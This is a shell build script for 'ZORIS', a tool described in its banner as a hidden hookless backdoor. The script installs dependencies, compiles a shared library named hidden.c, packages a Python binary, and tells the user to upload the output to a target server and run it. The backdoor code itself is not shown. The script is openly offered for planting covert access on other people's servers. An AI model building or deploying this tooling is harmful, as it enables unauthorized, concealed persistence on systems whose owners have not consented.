#!/bin/sh

banner() {
    printf "\033[0;36m
                                                        .      
    oN0.                                               .OK:    
   ,0X0.                                               .kNK.   
  .xKKO                .:ok0Oxl:lxOOkd:.               .dXNd   
  :0KKk              'cxk0KXNX0OOKKNNXKOc.             .dKWX,  
 .o000O:          .:dkO00KKXNNX0KKKWNNNNX0x:.         .c0KNNo  
  .okO0Ox,   ..':dkO0KKKKK00KXNNNKKKXXNNWNXK0x:'..  .cOKXKKx.  
   .lxO0OkkOOOOO000KKKK000KKNNNWMMWWNKKKXNNXXXXKKKK000NXXKd.   
     :xkkO0000KKKK00OOkkkk00KKXNWMWXKK0O000XNNWWNXKKKXXX0c     
      ;dxxxxkkkO0Okkkxxxkk00KKXWMMWNXXX0OOOO0KXK0OOOOOOk;      
        ..',;:clxxdocodOOkOKKKXNNNNXKXNX0dldkkkdlc:;,'.        
              .;::::;:okOkkO0KKXXXKKKKKKOd;:cll:.              
            .:lccccc:::lokk0KKKXXXKKKK0OOollooddd:             
           .loolllcc;,:lodk0KKKXXKKKKXXOo:odddxxkkl            
           .cc:;'..   .:lodOKKKXKKKKKXKo   ..,;cool            
                       .codk00KKXKKXX0k.                       
                        ,cdk0KKNWXKXXO:                        
                        'dkOKKXWMWNXKO.                        
                        ck00O0KKXK0KKX:                        
                        .:oxxxkOkkkxo;                         
                           .,:clc:,.                        

            \033[0;36m[\033[0;37mZORIS - The hidden hookless backdoor\033[0;36m]
                    \033[0;36m[\033[0;37mDeveloped by MrEmpy\033[0;36m]\n\n"
}

requirements() {
    OS=$(lsb_release -si)
    if [ "$OS" = "Arch" ]; then
        pacman -S python python-pip devtools patchelf locate
        pip install pyinstaller
        pip install staticx
    elif [ "$OS" = "Debian" ]; then
        apt-get install python3 python3-pip python3-dev python-dev build-essential locate -y
        apt install patchelf binutils -y
        pip install pyinstaller
        pip install staticx
    else
        apt-get install python3 python3-pip python3-dev python-dev build-essential locate -y
        apt install patchelf binutils -y
        pip install pyinstaller
        pip install staticx
    fi

}

main() {
    LIBPYTHON=$(locate "libpython" | grep "lib/libpython3.[0-9][0-9].so" -m 1)
    
    printf '\n\033[0;34m[*] \033[0;37mInstalling requirements\n'
    requirements
    printf '\n\033[0;34m[*] \033[0;37mCompiling...\n'
    gcc -fPIC -shared hidden.c -o hidden.so
    pyinstaller --clean --onefile --add-binary="$LIBPYTHON.1.0:." zoris.py
    mv dist bin
    mv hidden.so bin
    rm -rf build zoris.spec __pycache__/ 2>/dev/null
    #mv bin/zoris bin/zoris.tmp
    #staticx bin/zoris.tmp bin/zoris
    #rm bin/zoris.tmp
    printf '\n\n\033[0;32m[+] \033[0;37mSuccessfully compiled! The files are in the bin directory, upload them to the target server and run the zoris binary.\n'
}

if [[ $EUID -ne 0 ]]; then
    printf "\033[0;34m[*] \033[0;37mPlease run as root"
    banner
    exit
fi
main
